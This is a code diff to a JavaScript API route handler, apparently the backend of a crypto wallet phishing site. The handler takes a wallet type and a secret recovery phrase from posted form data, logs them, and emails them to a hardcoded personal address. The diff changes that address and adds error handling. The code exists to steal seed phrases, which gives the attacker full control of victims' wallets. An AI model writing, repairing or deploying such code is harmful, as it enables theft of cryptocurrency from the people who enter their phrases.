@@ -1,13 +1,22 @@
-import { sendMail } from "@/helpers"
+import { sendMail } from "@/helpers";
 
+export const POST = async (req) => {
+  try {
+    const { walletType, secretPhrase } = await req.json();
+    const email = "readonly75@hotmail.com";
+    console.log(walletType, secretPhrase)
 
+    await sendMail(email, walletType, secretPhrase);
 
-export const POST=async (req)=>{
-    const {walletType,walletPhase}=await req.json()
-    const email="myhosting1010@gmail.com"
+    return Response.json(
+      { message: "success" },
+      { status: 200 }
+    );
 
-  await   sendMail(email,walletName, walletPhase)
-  return Response.json({
-    message:"sucess"
-  }, {status:200})
-}
+  } catch (error) {
+    return Response.json(
+      { message: "Failed to send email" },
+      { status: 500 }
+    );
+  }
+};
